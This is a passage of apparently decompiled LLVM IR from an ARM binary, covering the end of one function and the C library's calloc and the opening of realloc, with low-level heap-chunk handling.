  %v0_12db0 = call i32 @__aeabi_read_tp()
  %v3_12db4 = load i16, i16* @global_var_2222c.358, align 2
  %v4_12db4 = sext i16 %v3_12db4 to i32
  store i32 %v4_12db4, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_12dbc = add i32 %v4_12db4, %v0_12db0
  %v4_12dbc = inttoptr i32 %v3_12dbc to i32*
  store i32 12, i32* %v4_12dbc, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12dc4

dec_label_pc_12dc4:                               ; preds = %bb154, %bb153, %dec_label_pc_12d88, %dec_label_pc_129d0, %dec_label_pc_12dac
  %v0_12dc4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12dc4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12dc8

dec_label_pc_12dc8:                               ; preds = %.thread4, %dec_label_pc_1299c, %.thread124, %dec_label_pc_1280c, %dec_label_pc_12800, %dec_label_pc_12668, %dec_label_pc_125ec, %dec_label_pc_12dc4
  store i32 %v2_1250c, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r2.global-to-local, align 4
  %v4_12dd8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 44) to i32*), align 4
  store i32 %v4_12dd8, i32* @ip, align 4
  store i32 77284, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12dd8)
  br label %dec_label_pc_12de4

dec_label_pc_12de4:                               ; preds = %dec_label_pc_12544, %dec_label_pc_12dc8
  %v0_12de4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12de4, i32* %r0.global-to-local, align 4
  store i32 %v3_124e0, i32* @r4, align 4
  store i32 %v6_124e0, i32* @r5, align 4
  store i32 %v9_124e0, i32* @r6, align 4
  store i32 %v12_124e0, i32* @r7, align 4
  store i32 %v15_124e0, i32* @r8, align 4
  store i32 %v18_124e0, i32* @sb, align 4
  store i32 %v21_124e0, i32* @sl, align 4
  store i32 %v24_124e0, i32* @fp, align 4
  store i32 %v27_124e0, i32* @lr, align 4
  ret i32 %v0_12de4

; uselistorder directives
  uselistorder i32 %v0_12d88, { 1, 0, 2 }
  uselistorder i32 %v3_12d70, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12d6c, { 1, 0 }
  uselistorder i32 %v2_12d50, { 2, 0, 1, 3 }
  uselistorder i32 %v4_12d48, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_12d00, { 1, 2, 0 }
  uselistorder i32 %v0_12cc8, { 1, 0 }
  uselistorder i32 %v0_12cbc, { 1, 0 }
  uselistorder i32 %v2_12cac, { 1, 0 }
  uselistorder i32 %v2_12c3c, { 2, 1, 0 }
  uselistorder i32 %v2_12c24, { 1, 2, 0, 3 }
  uselistorder i32 %v2_12c1c, { 1, 0, 2 }
  uselistorder i32 %v1_12c18, { 2, 1, 0 }
  uselistorder i32 %v0_12c18, { 3, 1, 2, 0 }
  uselistorder i32 %v1_12bfc, { 1, 0 }
  uselistorder i32 %v2_12bd4, { 1, 0 }
  uselistorder i32 %v3_12bc8, { 1, 0, 2 }
  uselistorder i32 %v2_12ba8, { 1, 0, 2 }
  uselistorder i32* %v2_12ba0, { 1, 0, 2 }
  uselistorder i32 %v0_12b88, { 1, 0 }
  uselistorder i32 %v6_12b64, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12b50, { 2, 1, 0 }
  uselistorder i32 %v0_12b38, { 1, 0 }
  uselistorder i32 %v2_12af4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12af0, { 1, 0 }
  uselistorder i32 %v3_12ac8, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_12aa8, { 1, 0, 2 }
  uselistorder i32 %v2_12a90, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12a38, { 2, 1, 0 }
  uselistorder i32 %v6_12a2c, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_12a08, { 2, 1, 0, 3 }
  uselistorder i32 %v3_129c8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12988, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_12980, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1297c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_12968, { 1, 0 }
  uselistorder i32 %v7_12928, { 1, 0 }
  uselistorder i32 %v4_12928, { 1, 0 }
  uselistorder i32 %v0_128f8, { 1, 0 }
  uselistorder i32 %v2_128cc, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_128c857, { 1, 0 }
  uselistorder i32 %v1_12894, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_1287c., { 1, 2, 0 }
  uselistorder i32 %v0_12884, { 0, 1, 3, 2 }
  uselistorder i32 %v1_12884, { 1, 0 }
  uselistorder i32 %v3_12864, { 1, 0 }
  uselistorder i32 %v4_12860, { 1, 0, 2 }
  uselistorder i32 %v1_127d0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12828, { 1, 0 }
  uselistorder i32 %v1_1280c, { 1, 0 }
  uselistorder i32 %v1_126ac, { 1, 0 }
  uselistorder i32 %v0_127ec, { 2, 0, 1, 3 }
  uselistorder i32 %v3_127b4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_12848.pre, { 1, 2, 0 }
  uselistorder i32 %v0_12790, { 2, 1, 0 }
  uselistorder i32 %v3_12784, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_126a4, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_1274c, { 1, 0 }
  uselistorder i32 %v3_12740, { 1, 0 }
  uselistorder i32 %v0_1274c, { 1, 0 }
  uselistorder i32 %v3_12724, { 0, 2, 3, 1 }
  uselistorder i32 %v2_12714, { 1, 0, 2 }
  uselistorder i32 %v3_126cc, { 2, 1, 0 }
  uselistorder i32 %v0_126bc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1268c, { 1, 0 }
  uselistorder i32 %v1_12640, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1263c, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_125e0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_125d4, { 1, 0 }
  uselistorder i32 %v3_125a4, { 1, 0 }
  uselistorder i32 %v0_12598, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_12578, { 0, 2, 1, 3 }
  uselistorder i1 %v7_1256c, { 1, 0 }
  uselistorder i32 %v0_1253c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 45, 42, 43, 44, 46, 47, 48, 49, 1, 2, 50, 51, 52, 53, 54, 55, 56, 57, 58, 63, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 83, 91, 78, 79, 80, 81, 82, 84, 85, 86, 87, 0, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 28, 2, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 25, 23, 22, 24, 27, 26, 29, 34, 30, 31, 0, 32, 33, 35, 36, 37, 40, 41, 38, 39, 46, 43, 42, 44, 45, 47, 52, 48, 49, 50, 51, 54, 53, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_12de4, { 1, 0 }
  uselistorder label %dec_label_pc_12dc8, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_12dc4, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_12dac, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_12d40, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12cbc, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_12cb4, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_12b88, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_12abc, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_12974, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_128c8, { 1, 0 }
  uselistorder label %dec_label_pc_128d0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_12894, { 1, 0 }
  uselistorder label %dec_label_pc_12848, { 1, 0 }
  uselistorder label %dec_label_pc_127dc, { 1, 0 }
  uselistorder label %dec_label_pc_127d8, { 1, 0 }
  uselistorder label %dec_label_pc_12784, { 1, 0 }
  uselistorder label %dec_label_pc_12770, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12738, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12724, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_12df8(i32 %arg1) local_unnamed_addr {
dec_label_pc_12df8:
  %v0_12df8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12df8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_12df8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12df8, %bb
  %v4_12e14 = phi i32 [ %arg1, %dec_label_pc_12df8 ], [ 0, %bb ]
  ret i32 %v4_12e14

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_12e18 = load i32, i32* @r4, align 4
  %v6_12e18 = load i32, i32* @r5, align 4
  %v9_12e18 = load i32, i32* @r6, align 4
  %v12_12e18 = load i32, i32* @lr, align 4
  %v2_12e20 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_12e30 = mul i32 %arg2, %arg1
  store i32 %v2_12e30, i32* @r6, align 4
  br i1 %v2_12e20, label %dec_label_pc_12e68, label %dec_label_pc_12e38

dec_label_pc_12e38:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_12e40 = udiv i32 %v2_12e30, %arg1
  %v9_12e44 = icmp eq i32 %v2_12e40, %arg2
  br i1 %v9_12e44, label %dec_label_pc_12e68, label %dec_label_pc_12e4c

dec_label_pc_12e4c:                               ; preds = %dec_label_pc_12e38
  %v0_12e50 = call i32 @__aeabi_read_tp()
  %v3_12e54 = load i16, i16* @global_var_2222c.358, align 2
  %v4_12e54 = sext i16 %v3_12e54 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_12e60 = add i32 %v4_12e54, %v0_12e50
  %v4_12e60 = inttoptr i32 %v3_12e60 to i32*
  store i32 12, i32* %v4_12e60, align 4
  br label %dec_label_pc_12f2c

dec_label_pc_12e68:                               ; preds = %dec_label_pc_12e38, %entry
  %v4_12e6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 108) to i32*), align 4
  store i32 %v4_12e6c, i32* @r4, align 4
  %v4_12e84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 112) to i32*), align 4
  store i32 %v4_12e84, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12e84)
  %v0_12e98 = load i32, i32* @r5, align 4
  %v2_12e98 = add i32 %v0_12e98, 16
  %v3_12e98 = inttoptr i32 %v2_12e98 to i32*
  %v4_12e98 = load i32, i32* %v3_12e98, align 4
  store i32 %v4_12e98, i32* %ip.global-to-local, align 4
  store i32 77476, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12e98)
  %v0_12ea4 = load i32, i32* @r6, align 4
  store i32 %v0_12ea4, i32* @r0, align 4
  %v0_12ea8 = call i32 @malloc()
  store i32 %v0_12ea8, i32* %r4.global-to-local, align 4
  %v2_12eac = icmp eq i32 %v0_12ea8, 0
  br i1 %v2_12eac, label %.thread, label %dec_label_pc_12eb4

dec_label_pc_12eb4:                               ; preds = %dec_label_pc_12e68
  %v1_12eb4 = add i32 %v0_12ea8, -4
  %v2_12eb4 = inttoptr i32 %v1_12eb4 to i32*
  %v3_12eb4 = load i32, i32* %v2_12eb4, align 4
  %v1_12eb8 = and i32 %v3_12eb4, 2
  %v2_12eb8 = icmp eq i32 %v1_12eb8, 0
  br i1 %v2_12eb8, label %dec_label_pc_12ec0, label %.thread

dec_label_pc_12ec0:                               ; preds = %dec_label_pc_12eb4
  %v1_12ec06 = add i32 %v3_12eb4, -4
  %v1_12ec4 = and i32 %v1_12ec06, -4
  %v3_12ec8 = udiv i32 %v1_12ec4, 4
  store i32 %v3_12ec8, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_12ec4, 36
  %v2_12ed0 = icmp ult i32 %v1_12ec4, 33
  %v3_12ed0 = or i1 %tmp, %v2_12ed0
  br i1 %v3_12ed0, label %dec_label_pc_12edc, label %dec_label_pc_12ed4

dec_label_pc_12ed4:                               ; preds = %dec_label_pc_12ec0
  %v3_12ed4 = inttoptr i32 %v0_12ea8 to i8*
  %v4_12ed4 = call i32 @__GI_memset(i8* %v3_12ed4, i32 0, i32 %v1_12ec4)
  br label %.thread

dec_label_pc_12edc:                               ; preds = %dec_label_pc_12ec0
  %tmp7 = icmp eq i32 %v1_12ec4, 16
  %v2_12ee0 = inttoptr i32 %v0_12ea8 to i32*
  store i32 0, i32* %v2_12ee0, align 4
  %v1_12ee4 = load i32, i32* %r4.global-to-local, align 4
  %v2_12ee4 = add i32 %v1_12ee4, 4
  %v3_12ee4 = inttoptr i32 %v2_12ee4 to i32*
  store i32 0, i32* %v3_12ee4, align 4
  %v1_12ee8 = load i32, i32* %r4.global-to-local, align 4
  %v2_12ee8 = add i32 %v1_12ee8, 8
  %v3_12ee8 = inttoptr i32 %v2_12ee8 to i32*
  store i32 0, i32* %v3_12ee8, align 4
  %v2_12eec = icmp ult i32 %v1_12ec4, 13
  %v3_12eec = or i1 %tmp7, %v2_12eec
  br i1 %v3_12eec, label %.thread, label %dec_label_pc_12ef0

dec_label_pc_12ef0:                               ; preds = %dec_label_pc_12edc
  %v0_12ef0 = load i32, i32* %ip.global-to-local, align 4
  %v1_12ef4 = load i32, i32* %r4.global-to-local, align 4
  %v2_12ef4 = add i32 %v1_12ef4, 12
  %v3_12ef4 = inttoptr i32 %v2_12ef4 to i32*
  store i32 0, i32* %v3_12ef4, align 4
  %v1_12ef8 = load i32, i32* %r4.global-to-local, align 4
  %v2_12ef8 = add i32 %v1_12ef8, 16
  %v3_12ef8 = inttoptr i32 %v2_12ef8 to i32*
  store i32 0, i32* %v3_12ef8, align 4
  %tmp8 = icmp ult i32 %v0_12ef0, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_12f00

dec_label_pc_12f00:                               ; preds = %dec_label_pc_12ef0
  %v0_12f00 = load i32, i32* %ip.global-to-local, align 4
  %v7_12f00 = icmp eq i32 %v0_12f00, 9
  %v1_12f04 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f04 = add i32 %v1_12f04, 20
  %v3_12f04 = inttoptr i32 %v2_12f04 to i32*
  store i32 0, i32* %v3_12f04, align 4
  %v1_12f08 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f08 = add i32 %v1_12f08, 24
  %v3_12f08 = inttoptr i32 %v2_12f08 to i32*
  store i32 0, i32* %v3_12f08, align 4
  br i1 %v7_12f00, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12f00
  %v2_12f0c = load i32, i32* %r4.global-to-local, align 4
  %v3_12f0c = add i32 %v2_12f0c, 32
  %v4_12f0c = inttoptr i32 %v3_12f0c to i32*
  store i32 0, i32* %v4_12f0c, align 4
  %v2_12f10 = load i32, i32* %r4.global-to-local, align 4
  %v3_12f10 = add i32 %v2_12f10, 28
  %v4_12f10 = inttoptr i32 %v3_12f10 to i32*
  store i32 0, i32* %v4_12f10, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12f00, %dec_label_pc_12eb4, %dec_label_pc_12ef0, %dec_label_pc_12edc, %dec_label_pc_12e68, %dec_label_pc_12ed4, %bb
  store i32 1, i32* @r1, align 4
  %v0_12f20 = load i32, i32* @r5, align 4
  %v2_12f20 = add i32 %v0_12f20, 44
  %v3_12f20 = inttoptr i32 %v2_12f20 to i32*
  %v4_12f20 = load i32, i32* %v3_12f20, align 4
  store i32 %v4_12f20, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12f20)
  br label %dec_label_pc_12f2c

dec_label_pc_12f2c:                               ; preds = %dec_label_pc_12e4c, %.thread
  %v0_12f2c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_12e18, i32* @r4, align 4
  store i32 %v6_12e18, i32* @r5, align 4
  store i32 %v9_12e18, i32* @r6, align 4
  store i32 %v12_12e18, i32* @lr, align 4
  ret i32 %v0_12f2c

; uselistorder directives
  uselistorder i32 %v1_12ec4, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_12ea8, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 8, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12f2c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12f58 = load i32, i32* @r4, align 4
  %v6_12f58 = load i32, i32* @r5, align 4
  %v9_12f58 = load i32, i32* @r6, align 4
  %v12_12f58 = load i32, i32* @r7, align 4
  %v15_12f58 = load i32, i32* @r8, align 4
  %v18_12f58 = load i32, i32* @sb, align 4
  %v21_12f58 = load i32, i32* @sl, align 4
  %v24_12f58 = load i32, i32* @fp, align 4
  %v27_12f58 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_12f64 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_12f64, label %dec_label_pc_12f78, label %dec_label_pc_12f88

dec_label_pc_12f78:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_12f7c = call i32 @malloc()
  store i32 %v0_12f7c, i32* %r0.global-to-local, align 4
  store i32 %v0_12f7c, i32* @r4, align 4
  br label %dec_label_pc_132e8

dec_label_pc_12f88:                               ; preds = %entry
  %v2_12f88 = icmp eq i32 %arg2, 0
  br i1 %v2_12f88, label %dec_label_pc_12f90, label %dec_label_pc_12f9c

dec_label_pc_12f90:                               ; preds = %dec_label_pc_12f88
  %v0_12f90 = call i32 @free()
  store i32 %v0_12f90, i32* %r0.global-to-local, align 4
  %v0_12f94 = load i32, i32* @r6, align 4
  store i32 %v0_12f94, i32* @r4, align 4
  br label %dec_label_pc_132e8

dec_label_pc_12f9c:                               ; preds = %dec_label_pc_12f88
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_12fa4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 108) to i32*), align 4
  store i32 %v4_12fa4, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_12fa4, i32* %r2.global-to-local, align 4
  %v4_12fb0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 68) to i32*), align 4
  store i32 %v4_12fb0, i32* %r1.global-to-local, align 4
  %v2_12fb4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_12fb4, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_12fbc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12fbc)
  %v0_12fc8 = load i32, i32* @r4, align 4
  store i32 %v0_12fc8, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r1.global-to-local, align 4
  %v4_12fd4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_12fe0.462 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12fd4)
  %v0_12fe0 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_12fe0, -32
  br i1 %tmp36, label %dec_label_pc_13004, label %dec_label_pc_12fe8

dec_label_pc_12fe8:                               ; preds = %dec_label_pc_12f9c
  store i32 62004, i32* %r2.global-to-local, align 4
  %v0_12fec = call i32 @__aeabi_read_tp()
  store i32 %v0_12fec, i32* %r0.global-to-local, align 4
  %v3_12ff0 = load i16, i16* @global_var_2222c.358, align 2
  %v4_12ff0 = sext i16 %v3_12ff0 to i32
  store i32 %v4_12ff0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_12ffc = add i32 %v4_12ff0, %v0_12fec
  %v4_12ffc = inttoptr i32 %v3_12ffc to i32*
  store i32 12, i32* %v4_12ffc, align 4
  br label %dec_label_pc_132e8

dec_label_pc_13004:                               ; preds = %dec_label_pc_12f9c
  %v1_13004 = add i32 %v0_12fe0, 11
  store i32 %v1_13004, i32* %r0.global-to-local, align 4
  %v0_13008 = load i32, i32* @r5, align 4
  %v1_13008 = add i32 %v0_13008, -4
  %v2_13008 = inttoptr i32 %v1_13008 to i32*
  %v3_13008 = load i32, i32* %v2_13008, align 4
  store i32 %v3_13008, i32* %r2.global-to-local, align 4
  %v2_1300c = icmp ugt i32 %v1_13004, 14
  %v7_1300c = icmp eq i32 %v1_13004, 15
  %v2_13010 = xor i1 %v2_1300c, true
  %v3_13010 = or i1 %v7_1300c, %v2_13010
  br i1 %v3_13010, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_13004
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_13004, %bb
  %v2_13014 = xor i1 %v7_1300c, true
  %v3_13014 = and i1 %v2_1300c, %v2_13014
  br i1 %v3_13014, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_13014 = and i32 %v1_13004, -8
  store i32 %v5_13014, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_13018 = and i32 %v3_13008, 2
  %v2_13018 = icmp eq i32 %v1_13018, 0
  %v1_1301c = add i32 %v0_13008, -8
  store i32 %v1_1301c, i32* @sl, align 4
  %v1_13020 = and i32 %v3_13008, -4
  store i32 %v1_13020, i32* @r6, align 4
  br i1 %v2_13018, label %dec_label_pc_13028, label %dec_label_pc_13200

dec_label_pc_13028:                               ; preds = %bb29
  %v1_13028 = load i32, i32* @sb, align 4
  %v3_13028 = icmp ult i32 %v1_13020, %v1_13028
  br i1 %v3_13028, label %dec_label_pc_13034, label %bb30

bb30:                                             ; preds = %dec_label_pc_13028
  store i32 %v1_13020, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13198

dec_label_pc_13034:                               ; preds = %dec_label_pc_13028
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1303c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 64) to i32*), align 4
  store i32 %v4_1303c, i32* %r0.global-to-local, align 4
  %v1_13040 = add i32 %v4_1303c, 44
  %v2_13040 = inttoptr i32 %v1_13040 to i32*
  %v3_13040 = load i32, i32* %v2_13040, align 4
  store i32 %v3_13040, i32* %r3.global-to-local, align 4
  %v2_13044 = add i32 %v1_13020, %v1_1301c
  store i32 %v2_13044, i32* @r4, align 4
  %v9_13048 = icmp eq i32 %v2_13044, %v3_13040
  %v1_1304c = add i32 %v2_13044, 4
  %v2_1304c = inttoptr i32 %v1_1304c to i32*
  %v3_1304c = load i32, i32* %v2_1304c, align 4
  store i32 %v3_1304c, i32* %r1.global-to-local, align 4
  br i1 %v9_13048, label %dec_label_pc_13054, label %dec_label_pc_13090

dec_label_pc_13054:                               ; preds = %dec_label_pc_13034
  %v1_13054 = and i32 %v3_1304c, -4
  %v2_13058 = add i32 %v1_13054, %v1_13020
  store i32 %v2_13058, i32* %r1.global-to-local, align 4
  %v1_1305c = add i32 %v1_13028, 16
  store i32 %v1_1305c, i32* %r3.global-to-local, align 4
  %v3_13060 = icmp ult i32 %v2_13058, %v1_1305c
  br i1 %v3_13060, label %dec_label_pc_130e4, label %dec_label_pc_13068

dec_label_pc_13068:                               ; preds = %dec_label_pc_13054
  %v2_13068 = sub i32 %v2_13058, %v1_13028
  %v1_1306c = urem i32 %v3_13008, 2
  %v2_13070 = add i32 %v1_13028, %v1_1301c
  store i32 %v2_13070, i32* %r1.global-to-local, align 4
  %v2_13074 = or i32 %v1_13028, %v1_1306c
  store i32 %v2_13074, i32* %r2.global-to-local, align 4
  %v1_13078 = or i32 %v2_13068, 1
  store i32 %v1_13078, i32* %r3.global-to-local, align 4
  store i32 %v0_13008, i32* @r4, align 4
  store i32 %v2_13074, i32* %v2_13008, align 4
  %v0_13084 = load i32, i32* %r1.global-to-local, align 4
  %v1_13084 = load i32, i32* %r0.global-to-local, align 4
  %v2_13084 = add i32 %v1_13084, 44
  %v3_13084 = inttoptr i32 %v2_13084 to i32*
  store i32 %v0_13084, i32* %v3_13084, align 4
  %v0_13088 = load i32, i32* %r3.global-to-local, align 4
  %v1_13088 = load i32, i32* %r1.global-to-local, align 4
  %v2_13088 = add i32 %v1_13088, 4
  %v3_13088 = inttoptr i32 %v2_13088 to i32*
  store i32 %v0_13088, i32* %v3_13088, align 4
  br label %dec_label_pc_132cc

dec_label_pc_13090:                               ; preds = %dec_label_pc_13034
  %v1_13090 = and i32 %v3_1304c, -2
  %v2_13094 = add i32 %v1_13090, %v2_13044
  store i32 %v2_13094, i32* %r3.global-to-local, align 4
  %v1_13098 = add i32 %v2_13094, 4
  %v2_13098 = inttoptr i32 %v1_13098 to i32*
  %v3_13098 = load i32, i32* %v2_13098, align 4
  store i32 %v3_13098, i32* %r3.global-to-local, align 4
  %v1_1309c = urem i32 %v3_13098, 2
  %v2_1309c = icmp eq i32 %v1_1309c, 0
  br i1 %v2_1309c, label %dec_label_pc_130a4, label %dec_label_pc_130e4

dec_label_pc_130a4:                               ; preds = %dec_label_pc_13090
  %v1_130a4 = and i32 %v3_1304c, -4
